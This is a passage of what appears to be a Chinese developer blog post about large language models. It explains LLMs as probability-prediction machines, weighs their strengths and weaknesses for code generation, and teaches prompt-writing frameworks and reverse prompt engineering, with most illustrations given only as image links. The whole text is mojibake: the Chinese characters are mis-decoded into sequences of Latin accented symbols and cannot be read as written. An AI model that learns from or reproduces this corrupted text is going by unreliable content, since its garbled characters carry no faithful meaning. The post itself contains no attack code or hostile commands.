<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7ebffcaf1cc4cdc83d4e4ed894cdb3b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=H%2BSqFCQNaR6yEYFEyRJ%2BgBvBAHA%3D" alt="" loading="lazy"/></p>
<p>ğŸ¤£ è€å©†åœ¨æ—¥å¸¸è®¾è®¡æ—¶ä¹Ÿä¼šç”¨ <strong>AI</strong> æ¥å·æ‡’ï¼Œæ¯”å¦‚ï¼šç”Ÿæˆé…å›¾ã€æé«˜æ¸…æ™°åº¦ã€æ‰©å›¾ç­‰ã€‚</p>
<h3 data-id="heading-8">3.3. AI æ˜¯ä»€ä¹ˆ? â€”â€” æ¦‚ç‡é¢„æµ‹æœºå™¨</h3>
<p>ç°é˜¶æ®µè°ˆè®º <strong>AI</strong>ï¼Œå…¶å®éƒ½æ˜¯åœ¨è°ˆè®º <strong>å¤§æ¨¡å‹</strong> (<strong>LLM</strong>) â€”â€” ä¸€ä¸ªæå…¶å¤æ‚çš„ "<strong>æ¦‚ç‡é¢„æµ‹æœºå™¨</strong>"ã€‚</p>
<blockquote>
<p>é€šè¿‡å­¦ä¹ æµ·é‡æ•°æ®çš„ "<strong>ç»Ÿè®¡è§„å¾‹</strong>"ï¼Œé€æ­¥é€¼è¿‘è¿™äº›æ•°æ®èƒŒåçš„ "<strong>æ¦‚ç‡åˆ†å¸ƒ</strong>"ï¼Œä»è€Œèƒ½å¤Ÿåœ¨ç»™å®š "<strong>ä¸Šä¸‹æ–‡</strong>" æ—¶é¢„æµ‹æœ€åˆç†çš„ä¸‹ä¸€æ­¥è¾“å‡ºã€‚</p>
</blockquote>
<p>ä¸åŒç±»å‹äº§ç‰©çš„ç”ŸæˆåŸç†å›¾è§£ (çœ‹ä¸æ‡‚æ²¡å…³ç³»ï¼Œç®€å•äº†è§£ä¸‹å³å¯)ï¼š</p>
<p>â‘  <strong>æ–‡æœ¬</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec4068de98b64b42bc530f77fe1faf8d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=u1u8yeftzh%2FoJKTFbpPWGt4YhFU%3D" alt="" loading="lazy"/></p>
<p><strong>â‘¡ å›¾ç‰‡ (æ‰©æ•£æ¨¡å‹ &amp; è‡ªå›å½’æ¨¡å‹)</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/153913f2ae0c4fa6956aef9366165799~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=ClMIsxjcxXAYyBFKpD%2FLA5NGia8%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9fd8e794a1194e0e92c828dd49dc291c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=5qTDiYqU9b0f60kFtgdpnrIJmes%3D" alt="" loading="lazy"/></p>
<p><strong>â‘¢ éŸ³é¢‘ (è‡ªå›å½’æ¨¡å‹ &amp; Codec + Token é¢„æµ‹ )</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5747f2017bbd44d1903cb2eca0874422~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=Oix31SQ71VXXzjote7ReFUCAhz0%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/808253896b604382a74873cb60bd1d5c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=gU1t2CCq1MCZvW43yLC924dpqR8%3D" alt="" loading="lazy"/></p>
<p><strong>â‘£ è§†é¢‘ (æ‰©æ•£å¼ &amp; è‡ªå›å½’/æ—¶ç©ºToken)</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51e631d2e36440c4a3f46ca509bfbfd4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=TLTJwQb6oR%2FePc831%2B4yBgT2IRA%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f8653817dbf41f5a62ed6a4e590f474~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=sCUV%2Fem9iyfL4G9ooKc5kyPySb0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-9">3.4. AI çš„èƒ½åŠ›è¾¹ç•Œ â€”â€” ä¼˜/åŠ£åŠ¿</h3>
<blockquote>
<p><strong>LLM æ“…é•¿å‘ç° "ç›¸å…³æ€§"ï¼Œä½†éš¾ä»¥è¿›è¡ŒçœŸæ­£çš„ "å› æœæ¨ç†"ï¼Œå®ƒåªæ˜¯åœ¨ "æ¨¡ä»¿æ™ºèƒ½"ï¼Œè€Œé "çœŸæ­£åœ°ç†è§£æ„å›¾ï¼Œæ‹¥æœ‰æ„è¯†"ã€‚</strong> â€”â€” ã€Š<strong>æŠ è…šç”·å­©</strong>ã€‹</p>
</blockquote>
<p>å¼„æ¸…æ¥š <strong>AI</strong> çš„æœ¬è´¨æ˜¯ "<strong>æ¦‚ç‡é¢„æµ‹æœºå™¨</strong>" åï¼Œæ¥ç€ä» "<strong>ä»£ç ç”Ÿæˆ</strong>" çš„è§’åº¦æ¢³ç†ä¸‹å®ƒçš„ "<strong>ä¼˜åŠ¿</strong> &amp; <strong>åŠ£åŠ¿</strong>"ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5963d5ba17ab4e67bed6e75fbc9ae8cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=VqXxBr3Z8sWHvQIQLxO1TSgAlxc%3D" alt="" loading="lazy"/></p>
<p>äº†è§£å®Œ <strong>AI</strong> çš„ <strong>ä¼˜/åŠ£åŠ¿</strong> åï¼Œæ¥ç€å°±å¯ä»¥æ¨æ¼”ã€Œ<strong>äºº &amp; AI</strong>ã€ çš„ <strong>é«˜æ•ˆåä½œæ–¹å¼</strong>ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c23f13058df744789947fc0acc2425ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=2PgrgufqQx8QfCjT7rVhzu%2Fp%2Fu8%3D" alt="" loading="lazy"/></p>
<p><strong>ä¸€å¥è¯æ¦‚æ‹¬</strong>ï¼š</p>
<blockquote>
<p>AI è´Ÿè´£ "<strong>ç”Ÿäº§åŠ›</strong>" (é‡å¤ã€ç¹çã€é«˜ä¸Šä¸‹æ–‡ã€é«˜æ•´åˆçš„å·¥ä½œ)ï¼Œäººè´Ÿè´£ "<strong>æ–¹å‘ä¸è¾¹ç•Œ</strong>" (åˆ¤æ–­ã€åˆ›é€ ã€å†³ç­–ã€ç†è§£ç»„ç»‡ä¸ä¸šåŠ¡)ã€‚</p>
</blockquote>
<h2 data-id="heading-10">4. å¿…å¤‡æŠ€èƒ½ â€”â€” Prompt</h2>
<p>ä¸€èˆ¬è¯‘ä½œ "<strong>æç¤ºè¯</strong>" æˆ– "<strong>æè¿°è¯</strong>"ï¼Œä¸ªäººè®¤ä¸ºåè€…æ›´åŠ è´´åˆ‡ï¼Œå³ï¼š<strong>æè¿°é—®é¢˜/éœ€æ±‚çš„ "è¯å¥ç»„åˆ"</strong> ã€‚ã€Œ<strong>Prompt Engineering-æç¤ºè¯å·¥ç¨‹</strong>ã€æ˜¯æ‰€æœ‰äººéƒ½å¿…é¡»æŒæ¡çš„ "<strong>ä½¿ç”¨AIçš„æ ¸å¿ƒæŠ€èƒ½</strong>"ã€‚</p>
<h3 data-id="heading-11">4.1. æŠŠè¯è¯´æ¸…æ¥š</h3>
<p>ğŸ¶ åˆ«è¢«å‡ ä¸ªè‹±æ–‡å•è¯å“å€’ï¼Œç°åœ¨çš„ <strong>AI</strong> æ¯”å‡ å¹´å‰èªæ˜å¤šäº†ï¼Œ<strong>æ™®é€šäºº</strong> åªè¦èƒ½ï¼š</p>
<blockquote>
<p><strong>æŠŠè¯‰æ±‚è®²å¾—æ¸…æ™°ã€å®Œæ•´ã€æœ‰é€»è¾‘ï¼Œå°±èƒ½è§£å†³ç»å¤§å¤šæ•°é—®é¢˜</strong>ã€‚</p>
</blockquote>
<p>ç¤ºä¾‹ï¼š</p>
<ul>
<li>âŒ æ··ä¹±è¯´æ³•ï¼šå¸®æˆ‘è®¡åˆ’ä¸ªå‘¨æœ«ç©çš„åœ°æ–¹ã€‚</li>
<li>âœ… æœ‰æ¡ç†è¯´æ³•ï¼šå‘¨æœ«æƒ³å¸¦5å²å­©å­ä¸€æ—¥æ¸¸ï¼Œ2å¤§1å°ï¼Œé¢„ç®—500ä»¥å†…ï¼ŒåŒ—äº¬ï¼Œä¸æƒ³è·‘å¤ªè¿œï¼Œèƒ½æ”¾ç”µã€æœ‰åƒé¥­çš„åœ°æ–¹ã€é¿å¼€æš´æ™’ï¼Œåœ°é“å¯è¾¾æœ€å¥½ã€‚</li>
</ul>
<p>AIè¾“å‡ºç»“æœ (å‰è€…è¾“å‡ºä¸åŒåŸå¸‚çš„æ¸¸ç©æ–¹æ¡ˆï¼Œåè€…è¾“å‡ºäº†å…·ä½“çš„è¡Œç¨‹æ–¹æ¡ˆ)ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4168b855b6154ecfbe23479376f2fcdf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=v8n5uHp234rBk%2B1eurncMKVAXpI%3D" alt="" loading="lazy"/><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/daf35cecb39e4a529d923ef5b469c1dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=MaqbLN4cfYjjHVAZnlHREuYyK%2Fg%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-12">4.2. å¥—æ¡†æ¶</h3>
<p>å†å¾€ä¸Šèµ°ï¼Œå°±æ˜¯äº†è§£ä¸€äº›ç»å…¸çš„ "<strong>Promptæ¡†æ¶</strong>"ï¼Œç„¶åå†æé—®æ—¶å¥—ç”¨ï¼Œä»¥æé«˜ <strong>AI</strong> è¾“å‡ºçš„ç¨³å®šæ€§ã€å‡†ç¡®æ€§å’Œè´¨é‡ã€‚æ‰€è°“çš„ "<strong>æ¡†æ¶</strong>"ï¼Œå…¶å®å°±æ˜¯ "<strong>ç»“æ„åŒ–æ¨¡æ¿</strong>"ï¼Œè§„å®šé—®é¢˜ä¸­åŒ…å«å“ªäº› "<strong>è¦ç´ </strong>"ï¼Œæ¯”å¦‚æœ€ç»å…¸çš„ã€Œ<strong>CTRF</strong>ã€æ¡†æ¶ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a2964827ace4da9aef699bd4ce02cad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=nyvRN2NdcGd9AxMSdioJ6%2F5L6is%3D" alt="" loading="lazy"/></p>
<p>å¥—æ¡†æ¶ç¤ºä¾‹ (å¡«ç©ºé¢˜~)ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/39018f89614a4547985d8d3efd03db9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=Y%2BsqkSkWnpmRpF%2FyiplxiM9UWy8%3D" alt="" loading="lazy"/></p>
<p>å¸¸è§çš„æ¡†æ¶è¿˜æœ‰ <strong>RTF</strong>ã€<strong>COSTAR</strong>ã€<strong>SPAR</strong>ã€<strong>COT</strong>ã€<strong>APE</strong> ç­‰ç­‰ï¼Œé€‚ç”¨äºä¸åŒçš„åœºæ™¯ã€‚æ°å“¥æ•´åˆäº†è‡ªå·±çŸ¥é“çš„æ‰€æœ‰æ¡†æ¶ç²¾åå’Œé«˜çº§æŠ€å·§ï¼Œå¼„äº†é€šç”¨çš„ã€Œ<strong>Prompt æœ€ä½³å®è·µæ¸…å•</strong>ã€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a9b8d4ee9894c42aa131877f139c2b8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=tDnrH83SuqJDv9Q0geXf9zXsexE%3D" alt="" loading="lazy"/></p>
<p>æ— è„‘å¥—å°±æ˜¯äº†ï¼Œ<strong>åŠ©è®°å£è¯€</strong>ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/727a4b8c379543e3a7f92aa49a8f30dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=4q2u%2F68jzfJjDngLjBMXFU870J8%3D" alt="" loading="lazy"/></p>
<p>ä¹Ÿå¯ä»¥ç”¨æ•…äº‹æµç¨‹æ¥ä¸²è”åŠ©è®°ï¼Œè¯»è€…å¯è‡ªè¡Œå‘æŒ¥ï¼Œé¡ºåºæ— éœ€å›ºå®šï¼š</p>
<blockquote>
<p>è®©ä¸€ä½è¯´ä¹¦äºº (<strong>è§’è‰²</strong>) ï¼Œç”¨ç”ŸåŠ¨çš„è¯­æ°” (<strong>é£æ ¼è¯­æ°”</strong>) ï¼Œç»™å­©å­ä»¬ (<strong>å—ä¼—</strong>) è®²ä¸ªæ•…äº‹ (<strong>æŒ‡ä»¤</strong>) ã€‚æ•…äº‹çš„å¼€å¤´ (<strong>ä¸Šä¸‹æ–‡</strong>) æ˜¯...ï¼Œç»“å±€ (<strong>ç›®æ ‡</strong>) è¦æ„Ÿäººã€‚æ•…äº‹çš„ç»“æ„ (<strong>æ ¼å¼</strong>) è¦åƒè¿™æ · (<strong>ç¤ºä¾‹</strong>) ï¼Œä½†ä¸è¦ (<strong>çº¦æŸ</strong>) å‡ºç°æš´åŠ›æƒ…èŠ‚ã€‚è¯·å…ˆæ„æ€æƒ…èŠ‚ (<strong>é€æ­¥æ€è€ƒ</strong>) ï¼Œå†™å®Œåå†æƒ³æƒ³æ€ä¹ˆèƒ½æ›´ç²¾å½© (<strong>åæ€</strong>) ã€‚</p>
</blockquote>
<p>ğŸ˜„ æ‡’å¾—è®°çš„è¯ï¼Œå¯ä»¥ç”¨æˆ‘ä¹‹å‰æ­çš„å°å·¥å…· â†’<a href="https://aicoding.juejin.cn/work/7532072347031060507" target="_blank" title="https://aicoding.juejin.cn/work/7532072347031060507">ã€ŒCP AI PromptåŠ©æ‰‹ã€</a></p>
<p>é…ä¸‹ <strong>DeepSeek</strong> çš„ <strong>Key</strong>ï¼Œå¤åˆ¶ç²˜è´´ä½ å†™çš„ <strong>ç®€å•Prompt</strong>ï¼Œå®ƒä¼šåŸºäºä¸Šé¢çš„åä¸ªç»´åº¦å¯¹æç¤ºè¯è¿›è¡Œä¼˜åŒ–ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53f0404bad1a4e57b0f71b38278f97c7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=JImcN2y2m8h6O%2BM2iBSHloh0Cgo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-13">4.3. å†™å‡ºç‰›é€¼çš„Prompt</h3>
<p>æ˜ç™½äº†æ€ä¹ˆ "<strong>å¥—æ¡†æ¶</strong>" å†™ "<strong>ç»“æ„åŒ–çš„Prompt</strong>"ï¼Œä½†ä½ å¯èƒ½è¿˜æ˜¯ä¼šæ„Ÿåˆ°ç–‘æƒ‘ï¼š</p>
<blockquote>
<p>ç”¨çš„åŒæ ·çš„AIï¼Œä¸ºä»€ä¹ˆåˆ«äººçš„ç”Ÿæˆæ•ˆæœå°±æ˜¯æ¯”æˆ‘å¥½ï¼Ÿ</p>
</blockquote>
<p>å°¤å…¶åœ¨ <strong>AI ç”Ÿå›¾</strong> é¢†åŸŸï¼Œçœ‹å¤§ä½¬åˆ†äº«çš„ <strong>Prompt</strong>ï¼Œé‡Œé¢ä¸€å †çœ‹ä¸æ‡‚çš„ä¸“ä¸šå‚æ•°ï¼š</p>
<blockquote>
<p>ç¯å¢ƒã€æ„å›¾ã€å…‰å½±ã€æ™¯æ·±ã€é•œå¤´ã€å…‰åœˆã€è‰²è°ƒã€æ°›å›´ã€èƒ¶ç‰‡é¢—ç²’ã€å¯¹æ¯”åº¦ã€ä¸»ä½“å¢å¼ºã€æ°›å›´ç¯...</p>
</blockquote>
<p>èƒ½å†™å‡ºè¿™ä¹ˆ <strong>ä¸“ä¸šçš„Prompt</strong>ï¼Œæ˜¯å› ä¸ºä»–ä»¬æœ‰ "<strong>ç›¸å…³é¢†åŸŸçš„è¡Œä¸šç»éªŒ</strong>" å—ï¼Ÿ</p>
<blockquote>
<p>ç­”ï¼šæœ‰åŠ æˆï¼Œä½†ä¸å…¨æ˜¯ã€‚é«˜æ‰‹çš„æ ¸å¿ƒæŠ€èƒ½ä¸æ˜¯ "<strong>è®°è¿™äº›ä¸“ä¸šçŸ¥è¯†</strong>"ï¼Œè€Œæ˜¯ï¼š<strong>çŸ¥é“å¦‚ä½•æŒ‡ä½¿ AI ç»™è‡ªå·±æä¾›ä¸“ä¸šçŸ¥è¯†ã€æ¡†æ¶ã€æœ¯è¯­ï¼Œç„¶åå†åå‘ç”¨è¿™äº›æ¡†æ¶è®© AI ç¼–å†™å’Œä¼˜åŒ– Promptã€‚</strong></p>
</blockquote>
<p>ğŸ˜„ å…¶å®æ€è·¯å¾ˆç®€å•ï¼Œæ‹†è§£ä¸‹è¿™å¥—æ–¹æ³•è®ºï¼š</p>
<blockquote>
<p><strong>ç»´åº¦è¯</strong> â†’ <strong>æœ¯è¯­/è¯åº“</strong> â†’ <strong>é€šç”¨æ¨¡æ¿</strong> â†’ <strong>å¡«ç©ºå¾—ç¬¬ä¸€ç‰ˆPrompt</strong> â†’ <strong>AIä¸“å®¶è§†è§’ä¼˜åŒ–</strong> â†’ <strong>è¿­ä»£ä¼˜åŒ–æ²‰æ·€</strong></p>
</blockquote>
<p>è¯¦ç»†ç©æ³•å¯ä»¥çœ‹ä¸‹å›¾ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1bb16a30a84a44a79248872756c88e99~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=7inYo1gXFmN4Rnv4VJrkCYiMihM%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-14">4.4. Prompt é€†å‘</h3>
<p><strong>Prompt é€†å‘å·¥ç¨‹</strong>ï¼ˆ<strong>RPE</strong>ï¼ŒReverse Prompt Engineering)ï¼Œå°±æ˜¯ï¼šä» "<strong>è¾“å‡º</strong>" åæ¨ "<strong>æ˜¯ä»€ä¹ˆPrompt</strong>" ç”Ÿæˆäº†å®ƒã€‚ä¸€èˆ¬ç”¨äºï¼š<strong>å­¦ä¹ ä¼˜ç§€æ¡ˆä¾‹</strong>ã€<strong>è°ƒè¯•å’Œè¯Šæ–­é—®é¢˜</strong>ã€<strong>æ„å»ºPromptåº“å’Œæ¨¡æ¿</strong>ã€<strong>ä¼ä¸šè´¨é‡æ§åˆ¶</strong>ã€<strong>å®‰å…¨å®¡è®¡</strong> (é˜²å¾¡Promptæ³¨å…¥æ”»å‡»)ã€‚</p>
<h4 data-id="heading-15">4.4.1. ç®€å•ç‰ˆ</h4>
<p><strong>æ™®é€šäºº</strong> ç”¨è¿™ä¸ªå¥—è·¯å°±å¤Ÿäº†ï¼Œé€‰ä¸ªèªæ˜ç‚¹çš„æ¨¡å‹ (å¦‚ï¼š<strong>GPT5</strong> æˆ– <strong>Gemini 3 Pro</strong>)ï¼Œç²˜è´´å›¾ç‰‡ï¼Œå†™ <strong>Prompt</strong> è®©å®ƒåæ¨ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a3a771005154755868944a6d60aab71~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=9lJcI38rJRi4r3Q65BTHVXCky7o%3D" alt="" loading="lazy"/></p>
<p>å·®å¾—æœ‰ç‚¹è¿œï¼Œæè¿°ã€Œ<strong>ä¸æ»¡æ„çš„ç‚¹</strong>ã€ï¼Œè®©AIç»§ç»­ä¼˜åŒ–Promptï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de586b26153e48ec98cb1fd19ec28360~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=pQxn2ubTDbeXsPs5T32mipmp0xo%3D" alt="" loading="lazy"/></p>
<p>æ¥ç€ç”¨ä¼˜åŒ–åçš„ <strong>Prompt</strong> æ¥ç”Ÿæˆï¼Œå¯ä»¥çœ‹åˆ°æ•ˆæœå·®ä¸å¤šäº†ï¼Œæ¥ç€è®© AI æå–ä¸€ä¸ªã€Œ<strong>é€šç”¨çš„Prompt</strong>ã€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9dfaf9cb604d41e6a4acef1a22b09955~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=WOxKy7Iz23VUXCNKnrOMiW1eaGo%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4fa6c1c533464a47861c8c34c379cb50~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=pDto23YjFIlTtz3dHuK5Nb27YJc%3D" alt="" loading="lazy"/></p>
<p>æ‹¿ AI ç”Ÿæˆçš„ <strong>Prompt</strong> ç”Ÿå›¾ï¼Œçœ‹æ•ˆæœï¼Œæè¿°é—®é¢˜ï¼Œå¾ªç¯åå¤ï¼Œç›´åˆ°ç¨³å®šç”Ÿæˆè‡ªå·±æƒ³è¦çš„æ•ˆæœ~</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8bb1c6d597f74a67bf1fde0987b76e0f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=3m6ILVMXXfx69V2zHP1E%2FjcID0s%3D" alt="" loading="lazy"/><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70bddbd2237540059f626d851e7928f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=IHhGJLTV0F3kFt9jdUxm5V1w42k%3D" alt="" loading="lazy"/><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d2ff5a9c2df40d4b3a0f0c9e62524ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=yOULhL7%2FAa5gzx0l6lEB31SFdSc%3D" alt="" loading="lazy"/><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c131bdedcbe4ff893b1ca3ce7b38344~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=Ns48LrII%2BC6N1ODGBbsZr7PicI4%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-16">4.4.2. ä¸“ä¸šç‰ˆ</h4>
<p>ğŸ¶ å…¶å®ä¹Ÿå·®ä¸å¤šï¼Œåªæ˜¯æµç¨‹æ¯”è¾ƒ "<strong>æ ‡å‡†åŒ–</strong>"ï¼Œç»å¸¸æè¿˜èƒ½è‡ªå·±æ­ä¸ª "<strong>å·¥ä½œæµ</strong>"ï¼Œé€‚åˆä¸“ä¸šé€‰æ‰‹ï¼Œæ€è·¯ï¼š</p>
<blockquote>
<p><strong>å¿«é€Ÿæ‹†è§£</strong> â†’ <strong>æ¨æ–­ Prompt</strong> â†’ <strong>æå–è¦ç´ </strong> â†’ <strong>é‡å»º Prompt</strong> â†’ <strong>ä¼˜åŒ–è¿­ä»£</strong> â†’ <strong>æ¨¡æ¿åŒ–æ²‰æ·€</strong></p>
</blockquote>
<p>è¯¦ç»†å›¾è§£ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48be86d0e3da4af5843fe23ba6c73f96~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=1FqPermXBja400FjFChtBNhoK64%3D" alt="" loading="lazy"/></p>
<p>ä¸Šé¢æ˜¯é€šç”¨çš„ï¼Œè¿˜æœ‰å‡ ä¸ª <strong>é¢å¤–åŠŸèƒ½</strong> çš„ç©æ³•ä¹Ÿç½—åˆ—ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f85a35b5f7cf4fec9f636db7da73ef65~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=Y%2F3CCNnvAsn3rr7hDdhgXv0ZSaE%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-17">5. é”¦ä¸Šæ·»èŠ±â€”â€”æ‡‚ç‚¹AIå¸¸è¯†</h2>
